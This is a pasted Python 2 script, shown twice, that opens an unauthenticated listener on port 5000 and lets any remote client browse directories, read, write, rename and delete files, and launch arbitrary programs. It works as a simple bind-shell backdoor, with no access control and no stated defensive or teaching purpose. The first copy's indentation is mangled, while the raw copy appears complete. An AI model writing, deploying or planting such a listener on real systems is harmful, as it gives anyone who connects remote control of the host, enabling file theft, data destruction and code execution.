@@ -1,0 +1,154 @@
+import socket, os, threading, subprocess
+ 
+def parse(a,s):
+  while True:
+    a.send(os.getcwd()+"> ")
+    command = a.recv(1024)
+    command = command.strip("\n")
+    if command.startswith("ls"):
+      try:
+       dir = os.listdir(os.getcwd())      
+       for x in dir:
+    a.send(x+"\n")
+      except:a.send("Permission Denied\n")
+    elif command.startswith("cd "):
+      dir = command[3:]
+      dir = dir.rstrip("\r")
+      try:os.chdir(dir)
+      except:a.send("Dir doesn't exist.\n")
+    elif command.startswith("read "):
+    command = command.rstrip("\r")
+    try:
+     with open(command[5:], 'rb') as file:
+       for x in file.readlines():
+         a.send(x)
+       a.send("\n")
+    except:a.send("Permission denied or file is a dir.\n")
+    elif command.startswith("rm "):
+    command = command.rstrip("\r")
+    try:os.remove(command[3:])
+    except:a.send("File doesn't exist.\n")
+    elif command.startswith("rmdir "):
+    command = command.rstrip("\r")
+    try:os.rmdir(command[6:])
+    except:a.send("Dir doesn't exist.\n")
+    elif command.startswith("add "):
+    command = command.rstrip("\r")
+    g,b,c = command.partition("add ")
+    g,b,c = c.partition(" ")
+    try:
+     with open(g, 'a') as file:
+       file.write(c)
+    except: a.send("Something went wrong, either you don't have permission to edit the file, or the file is a dir.\n")
+    elif command.startswith("rename "):
+        command = command.rstrip("\r")
+        g,b,c = command.partition("rename ")
+        g,b,c = c.partition(" ")
+        try:
+         os.rename(g,c)
+        except: a.send("Something went wrong, either you don't have permission to edit the file, or the file is a dir.\n")
+ 
+    elif command.startswith("write "):
+    command = command.rstrip("\r")
+        g,b,c = command.partition("write ")
+        g,b,c = c.partition(" ")
+        try:
+         with open(g, 'wb') as file:
+           file.write(c)
+        except: a.send("Something went wrong, either you don't have permission to edit the file, or the file is a dir.\n")
+    elif command.startswith("exe "):
+    command = command.rstrip("\r")
+    try:subprocess.Popen(command[4:])
+    except:a.send("File doesn't exist\n")
+    elif command.startswith("exit"):a.close()
+    print command
+ 
+ 
+def main():
+  s = socket.socket()
+  s.bind(('', 5000))
+  s.listen(5)
+  while True:
+    a,b = s.accept()
+    print a
+    t = threading.Thread(target=parse, args=(a,s))
+    t.start()
+if __name__ == "__main__":main()
+
+RAW Paste Data
+import socket, os, threading, subprocess
+
+def parse(a,s):
+  while True:
+    a.send(os.getcwd()+"> ")
+    command = a.recv(1024)
+    command = command.strip("\n")
+    if command.startswith("ls"):
+      try:
+       dir = os.listdir(os.getcwd())      
+       for x in dir:
+ 	a.send(x+"\n")
+      except:a.send("Permission Denied\n")
+    elif command.startswith("cd "):
+      dir = command[3:]
+      dir = dir.rstrip("\r")
+      try:os.chdir(dir)
+      except:a.send("Dir doesn't exist.\n")
+    elif command.startswith("read "):
+	command = command.rstrip("\r")
+	try:
+	 with open(command[5:], 'rb') as file:
+	   for x in file.readlines():
+	     a.send(x)
+	   a.send("\n")
+ 	except:a.send("Permission denied or file is a dir.\n")
+    elif command.startswith("rm "):
+	command = command.rstrip("\r")
+	try:os.remove(command[3:])
+	except:a.send("File doesn't exist.\n")
+    elif command.startswith("rmdir "):
+	command = command.rstrip("\r")
+	try:os.rmdir(command[6:])
+	except:a.send("Dir doesn't exist.\n")
+    elif command.startswith("add "):
+	command = command.rstrip("\r")
+	g,b,c = command.partition("add ")
+	g,b,c = c.partition(" ")
+	try:
+	 with open(g, 'a') as file:
+	   file.write(c)
+	except: a.send("Something went wrong, either you don't have permission to edit the file, or the file is a dir.\n")
+    elif command.startswith("rename "):
+        command = command.rstrip("\r")
+        g,b,c = command.partition("rename ")
+        g,b,c = c.partition(" ")
+        try:
+         os.rename(g,c)
+        except: a.send("Something went wrong, either you don't have permission to edit the file, or the file is a dir.\n")
+
+    elif command.startswith("write "):
+	command = command.rstrip("\r")
+        g,b,c = command.partition("write ")
+        g,b,c = c.partition(" ")
+        try:
+         with open(g, 'wb') as file:
+           file.write(c)
+        except: a.send("Something went wrong, either you don't have permission to edit the file, or the file is a dir.\n")
+    elif command.startswith("exe "):
+	command = command.rstrip("\r")
+	try:subprocess.Popen(command[4:])
+	except:a.send("File doesn't exist\n")
+    elif command.startswith("exit"):a.close()
+    print command
+
+
+def main():
+  s = socket.socket()
+  s.bind(('', 5000))
+  s.listen(5)
+  while True:
+    a,b = s.accept()
+    print a
+    t = threading.Thread(target=parse, args=(a,s))
+    t.start()
+if __name__ == "__main__":main()
